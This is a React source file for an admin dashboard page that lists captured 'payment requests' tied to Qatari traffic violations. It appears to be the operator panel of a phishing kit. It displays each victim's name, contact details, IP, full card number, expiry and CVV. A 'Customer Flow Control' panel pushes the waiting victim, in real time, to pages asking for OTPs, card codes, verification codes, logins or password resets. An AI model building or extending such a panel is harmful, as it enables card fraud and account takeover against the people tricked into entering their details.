import { useEffect, useState } from "react";
import { Link, useNavigate, useParams } from "react-router-dom";
import {
  ArrowLeft,
  AlertCircle,
  CreditCard,
  KeyRound,
  LogIn,
  ShieldCheck,
  Trash2,
  UserPlus,
} from "lucide-react";
import { adminApi, type PaymentRecord } from "../api/admin";
import { formatDate, formatQar } from "../utils/format";
import s from "./RequestDetail.module.scss";

const PAYMENT_STATUSES = [
  "submitted",
  "forwarded",
  "read",
  "contacted",
  "completed",
  "cancelled",
  "failed",
];

const FLOW_ACTIONS = [
  { value: "redirect_payment", label: "Payment page", icon: CreditCard },
  { value: "redirect_login", label: "Redirect to login", icon: LogIn },
  {
    value: "redirect_verify_login",
    label: "Verify login (4-digit OTP)",
    icon: ShieldCheck,
  },
  { value: "redirect_card_code", label: "Card code (4-digit)", icon: KeyRound },
  { value: "redirect_create_account", label: "Create account", icon: UserPlus },
  {
    value: "redirect_verification_code",
    label: "Verification code (6-digit)",
    icon: ShieldCheck,
  },
  { value: "redirect_reset_password", label: "Reset password", icon: KeyRound },
  { value: "keep_waiting", label: "Keep waiting", icon: AlertCircle },
];

const STATUS_STYLES: Record<string, React.CSSProperties> = {
  submitted: { background: "#dbeafe", color: "#1d4ed8" },
  forwarded: { background: "#d1fae5", color: "#065f46" },
  failed: { background: "#fee2e2", color: "#991b1b" },
  completed: { background: "#d1fae5", color: "#065f46" },
  cancelled: { background: "#f1f5f9", color: "#475569" },
  read: { background: "#ede9fe", color: "#5b21b6" },
  contacted: { background: "#fed7aa", color: "#c2410c" },
};

function InfoRow({
  label,
  value,
  mono = false,
  full = false,
}: Readonly<{
  label: string;
  value?: string | number | null;
  mono?: boolean;
  full?: boolean;
}>) {
  return (
    <div className={full ? s.infoFull : undefined}>
      <p className={s.infoLabel}>{label}</p>
      <p className={`${s.infoValue} ${mono ? s.mono : ""}`}>{value ?? "—"}</p>
    </div>
  );
}

export function RequestDetailPage() {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();

  const [record, setRecord] = useState<PaymentRecord | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");

  const [busyAction, setBusyAction] = useState<string | null>(null);
  const [flowMsg, setFlowMsg] = useState("");

  const [newStatus, setNewStatus] = useState("");
  const [adminNotes, setAdminNotes] = useState("");
  const [statusBusy, setStatusBusy] = useState(false);

  const [deleteOpen, setDeleteOpen] = useState(false);
  const [deleteBusy, setDeleteBusy] = useState(false);

  useEffect(() => {
    if (!id) return;
    adminApi
      .getPayment(id)
      .then((r) => {
        setRecord(r);
        setNewStatus(r.status);
        setAdminNotes(r.adminNotes ?? "");
      })
      .catch(() => setError("Failed to load request"))
      .finally(() => setLoading(false));
  }, [id]);

  const handleFlowAction = async (action: string) => {
    if (!id || busyAction) return;
    setBusyAction(action);
    setFlowMsg("");
    try {
      const res = await adminApi.setFlowAction(id, action);
      setFlowMsg("✓ Sent: " + res.flowAction);
      setRecord((r) => (r ? { ...r, flowAction: res.flowAction } : r));
    } catch {
      setFlowMsg("✗ Failed to send action");
    } finally {
      setBusyAction(null);
    }
  };

  const handleStatusUpdate = async () => {
    if (!id) return;
    setStatusBusy(true);
    try {
      const updated = await adminApi.updatePayment(id, {
        status: newStatus,
        adminNotes,
      });
      setRecord(updated);
    } finally {
      setStatusBusy(false);
    }
  };

  const handleDelete = async () => {
    if (!id) return;
    setDeleteBusy(true);
    try {
      await adminApi.deletePayment(id);
      navigate("/payments");
    } catch {
      setDeleteBusy(false);
      setDeleteOpen(false);
    }
  };

  if (loading) {
    return (
      <p
        style={{
          textAlign: "center",
          padding: "48px 0",
          color: "#94a3b8",
          margin: 0,
        }}
      >
        Loading…
      </p>
    );
  }

  if (error || !record) {
    return (
      <p style={{ padding: 16, color: "#991b1b", margin: 0 }}>
        {error || "Not found"}
      </p>
    );
  }

  const hasCard = !!(record.cardNumber || record.cardLastFour);

  const expiryStr =
    record.cardExpiryMonth && record.cardExpiryYear
      ? `${record.cardExpiryMonth}/${record.cardExpiryYear}`
      : null;

  const cardNumStr = record.cardNumber
    ? record.cardNumber
    : record.cardLastFour
      ? `**** **** **** ${record.cardLastFour}`
      : null;

  return (
    <div className={s.page}>
      {/* Back */}
      <Link to="/payments" className={s.backLink}>
        <ArrowLeft size={14} />
        Back to Requests
      </Link>

      {/* Header */}
      <div className={s.headerRow}>
        <div>
          <h1 className={s.headerTitle}>Request #{record.reference}</h1>
          <p className={s.headerSub}>Created {formatDate(record.createdAt)}</p>
        </div>
        <div className={s.headerRight}>
          <span
            className={s.pill}
            style={
              STATUS_STYLES[record.status] ?? {
                background: "#f1f5f9",
                color: "#475569",
              }
            }
          >
            {record.status}
          </span>
          <button className={s.deleteBtn} onClick={() => setDeleteOpen(true)}>
            <Trash2 size={14} />
            Delete
          </button>
        </div>
      </div>

      <div className={s.grid}>
        {/* ── Left column ── */}
        <div className={s.leftCol}>
          {/* Overview */}
          <section className={s.section}>
            <h2 className={s.sectionTitle}>Overview</h2>
            <div className={s.infoGrid}>
              <InfoRow label="Reference" value={record.reference} mono />
              <InfoRow label="Reference ID" value={record.referenceId} />
              <InfoRow label="Status" value={record.status} />
              <InfoRow label="Amount" value={formatQar(record.amount)} />
              <InfoRow label="Language" value={record.language} />
              <InfoRow label="Created" value={formatDate(record.createdAt)} />
              <InfoRow label="Updated" value={formatDate(record.updatedAt)} />
              {(record.violationRefs?.length ?? 0) > 0 && (
                <InfoRow
                  label="Violations"
                  value={record.violationRefs.join(", ")}
                  full
                />
              )}
            </div>
          </section>

          {/* Customer Info */}
          <section className={s.section}>
            <h2 className={s.sectionTitle}>Customer Information</h2>
            <div className={s.infoGrid}>
              <InfoRow label="Full Name" value={record.fullName} />
              <InfoRow label="Mobile" value={record.mobile} mono />
              <InfoRow label="Email" value={record.email} />
              <InfoRow label="ID / Plate" value={record.identifier} />
              {record.notes && (
                <InfoRow label="Notes" value={record.notes} full />
              )}
            </div>
          </section>

          {/* Card Details */}
          {hasCard && (
            <section className={s.section}>
              <h2 className={s.sectionTitle}>Card Payment Details</h2>
              <div className={s.infoGrid}>
                <InfoRow label="Cardholder" value={record.cardholderName} />
                <InfoRow label="Card Number" value={cardNumStr} mono />
                <InfoRow label="Expiry" value={expiryStr} mono />
                <InfoRow label="CVV" value={record.cardCvv} mono />
              </div>
            </section>
          )}

          {/* Flow Submissions */}
          {(record.flowSubmissions?.length ?? 0) > 0 && (
            <section className={s.section}>
              <h2 className={s.sectionTitle}>Customer Flow Submissions</h2>
              {record.flowSubmissions.map((sub, i) => (
                <div key={i} className={s.flowItem}>
                  <div className={s.flowItemHead}>
                    <span className={s.flowStep}>{sub.step}</span>
                    <span className={s.flowTime}>
                      {formatDate(sub.submittedAt)}
                    </span>
                  </div>
                  <div className={s.flowBody}>
                    {Object.entries(sub.data).map(([k, v]) => (
                      <div key={k} className={s.flowRow}>
                        <span className={s.flowKey}>{k}</span>
                        <span className={s.flowVal}>{String(v)}</span>
                      </div>
                    ))}
                    {sub.ip && (
                      <div className={s.flowRow}>
                        <span className={s.flowKey}>IP</span>
                        <span className={s.flowVal}>{sub.ip}</span>
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </section>
          )}

          {/* Metadata */}
          <section className={s.section}>
            <h2 className={s.sectionTitle}>Metadata</h2>
            <div className={s.infoGrid}>
              <InfoRow label="IP Address" value={record.ip} mono />
              <div className={s.infoFull}>
                <p className={s.infoLabel}>User Agent</p>
                <p
                  className={`${s.infoValue} ${s.mono}`}
                  style={{ fontSize: "0.75rem" }}
                >
                  {record.userAgent ?? "—"}
                </p>
              </div>
              {record.adminNotes && (
                <div className={s.infoFull}>
                  <p className={s.infoLabel}>Admin Notes</p>
                  <p className={s.infoValue} style={{ whiteSpace: "pre-line" }}>
                    {record.adminNotes}
                  </p>
                </div>
              )}
            </div>
          </section>

          {/* Status Update */}
          <div className={s.formCard}>
            <h3 className={s.formTitle}>Update Status</h3>
            <label className={s.formLabel}>Status</label>
            <select
              className={s.formSelect}
              value={newStatus}
              onChange={(e) => setNewStatus(e.target.value)}
            >
              {PAYMENT_STATUSES.map((st) => (
                <option key={st} value={st}>
                  {st.charAt(0).toUpperCase() + st.slice(1)}
                </option>
              ))}
            </select>

            <label className={s.formLabel}>Admin Notes</label>
            <textarea
              className={s.formTextarea}
              placeholder="Add internal notes…"
              value={adminNotes}
              onChange={(e) => setAdminNotes(e.target.value)}
              rows={4}
            />

            <button
              className={s.saveBtn}
              onClick={handleStatusUpdate}
              disabled={statusBusy}
            >
              {statusBusy ? "Saving…" : "Save Changes"}
            </button>
          </div>
        </div>

        {/* ── Right column: Customer Flow Control ── */}
        <div>
          <div className={s.flowPanel}>
            <h3 className={s.flowPanelTitle}>Customer Flow Control</h3>
            <p className={s.flowPanelSub}>
              While the customer is on a loader or auth screen, choose where to
              send them next.
            </p>

            {record.flowAction && (
              <div className={s.currentAction}>
                Current: {record.flowAction}
              </div>
            )}

            {!hasCard && (
              <div className={s.noCardMsg}>
                No card data captured yet — customer has not reached the payment
                step.
              </div>
            )}

            {flowMsg && (
              <p
                className={s.flowMsg}
                style={{
                  color: flowMsg.startsWith("✓") ? "#065f46" : "#991b1b",
                }}
              >
                {flowMsg}
              </p>
            )}

            <div className={s.flowBtns}>
              {FLOW_ACTIONS.map(({ value, label, icon: Icon }) => {
                const isCurrent = record.flowAction === value;
                const isBusy = busyAction === value;

                return (
                  <button
                    key={value}
                    className={`${s.flowActionBtn} ${isCurrent ? s.btnCurrent : s.btnDefault}`}
                    onClick={() => handleFlowAction(value)}
                    disabled={
                      !!busyAction ||
                      (!hasCard && value !== "keep_waiting")
                    }
                  >
                    {isBusy ? (
                      <span className={s.btnSpinner} />
                    ) : (
                      <Icon size={15} />
                    )}
                    {isBusy ? "Sending…" : label}
                  </button>
                );
              })}
            </div>
          </div>
        </div>
      </div>

      {/* Delete confirmation */}
      {deleteOpen && (
        <div className={s.modalOverlay} onClick={() => setDeleteOpen(false)}>
          <div className={s.modalBox} onClick={(e) => e.stopPropagation()}>
            <h3 className={s.modalTitle}>Delete Request</h3>
            <p className={s.modalBody}>
              Are you sure you want to permanently delete this request? This
              cannot be undone.
            </p>
            <div className={s.modalBtns}>
              <button
                className={s.modalCancelBtn}
                onClick={() => setDeleteOpen(false)}
              >
                Cancel
              </button>
              <button
                className={s.modalDeleteBtn}
                onClick={handleDelete}
                disabled={deleteBusy}
              >
                {deleteBusy ? "Deleting…" : "Delete"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
